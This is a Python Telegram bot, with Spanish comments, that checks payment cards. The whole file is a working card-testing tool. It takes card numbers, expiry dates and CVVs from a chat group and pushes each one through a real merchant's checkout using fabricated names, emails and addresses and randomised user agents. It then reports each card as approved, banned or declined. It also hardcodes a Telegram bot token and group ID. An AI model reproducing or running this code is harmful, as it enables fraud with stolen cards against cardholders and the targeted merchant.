from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from telegram import Update
import logging, time, requests, names, random
from faker import Faker
from fake_useragent import UserAgent

# === CONFIGURACIÓN ===
TOKEN = '8136442047:AAEYKrCmR4f9F4fzy9bYraIgDdSEVn1fv8M'
GRUPO_AUTORIZADO = -1002518467030
COOLDOWN = 60  # segundos
ultimo_uso = {}

# === LOGS ===
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# === FUNCIONES AUXILIARES ===
def parsex(data, start, end):
    try:
        return data.split(start)[1].split(end)[0]
    except:
        return "None"

# === PLANTILLA PAYFLOW ===
def plantilla_payflow(cc):
    session = requests.Session()
    ua = UserAgent()
    user_agent = ua.random
    fake = Faker()

    gmail = f"{names.get_first_name()}{names.get_last_name()}{random.randint(100000, 999999)}@gmail.com"
    nombre = fake.first_name()
    apellido = fake.last_name()
    calle = fake.street_name()
    ciudad = fake.city()
    postal = fake.zipcode()
    num = fake.building_number()

    try:
        div = cc.strip().split("|")
        if len(div) != 4:
            return "❌ Formato inválido: xxxx|mm|aaaa|cvv"

        num_cc, mes, año, cvv = div

        r = session.post("https://m.stripe.com/6", headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }).json()

        muid, guid, sid = r['muid'], r['guid'], r['sid']
    except:
        return "❌ Error al obtener tokens Stripe"

    headers = {"User-Agent": user_agent}
    try:
        session.get("https://www.mymagic.com/cart/add/lessons/superball-card-rise-video-john-cornelius", headers=headers)
        cart = session.get("https://www.mymagic.com/cart", headers=headers)
        token_key = parsex(cart.text, 'data[_Token][key]" value="', '"')
        checkout = session.get("https://www.mymagic.com/cart/checkout", headers=headers)
        token_fields = parsex(checkout.text, 'data[_Token][fields]" value="', '"')
        token_debug = parsex(checkout.text, 'data[_Token][debug]" value="', '"')

        data = {
            '_method': 'POST',
            'data[_Token][key]': token_key,
            'data[Order][email]': gmail,
            'data[Order][bill_first_name]': nombre,
            'data[Order][bill_last_name]': apellido,
            'data[Order][bill_country]': 'US',
            'data[Order][bill_zip]': postal,
            'data[Order][bill_line_1]': f'{calle} {num}',
            'data[Order][bill_city]': ciudad,
            'data[Order][bill_state]': 'NY',
            'data[Cart][payment_method]': 'PaypalDirectPayment',
            'data[Cart][card_number]': num_cc,
            'data[Cart][expiration][month]': mes,
            'data[Cart][expiration][year]': año,
            'data[Cart][cvv]': cvv,
            'data[Order][subtotal]': '5.95',
            'data[Order][total]': '5.95',
            'data[_Token][fields]': token_fields,
            'data[_Token][debug]': token_debug,
        }

        res = session.post("https://www.mymagic.com/cart/checkout", data=data, headers=headers)
        msg = parsex(res.text, 'message message-error">Oops. There were issues with your order<br />', "</div>")

        if "Verification Number" in msg:
            return f"✅ APPROVED (CCN)\n💳 {cc}\n📩 {msg}"
        elif "Payment could not be completed" in msg:
            return f"🟣 GATEWAY BAN\n💳 {cc}\n📩 {msg}"
        else:
            return f"❌ DECLINED\n💳 {cc}\n📩 {msg or 'Sin respuesta'}"
    except Exception as e:
        return f"💥 ERROR:\n{str(e)}"

# === COMANDO PRINCIPAL ===
def handle_comando(update: Update, context):
    mensaje = update.message
    chat_id = mensaje.chat.id
    user_id = mensaje.from_user.id

    if chat_id != GRUPO_AUTORIZADO:
        return

    texto = mensaje.text.strip()
    ahora = time.time()

    if user_id in ultimo_uso and ahora - ultimo_uso[user_id] < COOLDOWN:
        restante = int(COOLDOWN - (ahora - ultimo_uso[user_id]))
        mensaje.reply_text(f"🕒 Espera {restante}s para volver a usar el checker.")
        return

    if texto.startswith(".chk "):
        tarjetas = texto.split(" ", 1)[1].strip().splitlines()
        tarjetas = tarjetas[:3]  # Máximo 3 tarjetas

        ultimo_uso[user_id] = ahora
        msg_status = mensaje.reply_text("🔍 Chequeando tarjetas...", reply_to_message_id=mensaje.message_id)

        resultados = []
        for cc in tarjetas:
            resultado = plantilla_payflow(cc)
            resultados.append(resultado)

        try:
            context.bot.edit_message_text(
                chat_id=msg_status.chat_id,
                message_id=msg_status.message_id,
                text="\n\n".join(resultados)
            )
        except:
            context.bot.send_message(chat_id=chat_id, text="\n\n".join(resultados))

def start(update, context):
    if update.effective_chat.id == GRUPO_AUTORIZADO:
        update.message.reply_text("✅ Bot activo. Usa:\n.chk tarjeta(s) para verificar por Payflow")

# === MAIN ===
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_comando))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
